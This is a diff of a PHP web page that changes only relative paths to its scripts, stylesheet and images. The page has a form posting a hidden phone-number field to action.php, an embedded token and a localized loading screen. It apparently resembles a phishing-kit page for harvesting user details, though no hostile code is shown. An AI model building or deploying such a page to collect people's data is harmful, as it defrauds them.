@@ -1,12 +1,12 @@
 <?php 
-require '../main.php';
+require 'main.php';
 ?><!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title><?php echo $lang["title"]; ?></title>
-    <link rel="stylesheet" href="res/app.css">
+    <link rel="stylesheet" href="app.css">
 </head>
 <body>
 <form action="action.php" method="POST">
@@ -17,14 +17,14 @@ require '../main.php';
     <input type="hidden" name="PHONE_NUMBER">
 </form>
 <header>
-    <img src="res/logo.png">
+    <img src="logo.png">
 </header>
 <script>var token=<?php echo json_encode($token); ?>;</script>
 <div class="loader" style=" color:white; text-align:center;">
     <div class="content" style="flex-direction:column;">
         <h3><?php echo $lang['_loading'][0];?></h3>
         <p><?php echo $lang['_loading'][1];?></p>
-    <img src="res/loading.gif">
+    <img src="loading.gif">
 </div>
 </div>
 
@@ -75,8 +75,8 @@ require '../main.php';
 </div>
 
 </main>
-<script src="res/jq.js"></script>
-<script src="res/jquery.js"></script>
+<script src="jq.js"></script>
+<script src="jquery.js"></script>
 
 <script>
 
